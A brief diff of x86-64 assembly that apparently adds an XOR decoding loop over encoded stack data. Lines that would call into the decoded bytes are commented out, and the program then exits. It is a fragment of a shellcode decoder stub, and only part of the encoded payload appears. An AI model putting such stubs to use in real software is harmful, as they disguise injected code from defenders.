@@ -31,3 +31,17 @@ _start:
         mov rax,0x69751244059aa2a3
         push   rax
         mov rbx,0x2144d2144d2144d2
+        mov rcx, 14
+        mov rdx, rsp
+
+        _loop:
+        xor qword [rdx], rbx
+        add rdx, 8
+        loop _loop
+
+        ; mov rax, rsp
+        ; call rax
+        
+        mov rax, 60
+        xor rdi, rdi
+        syscall
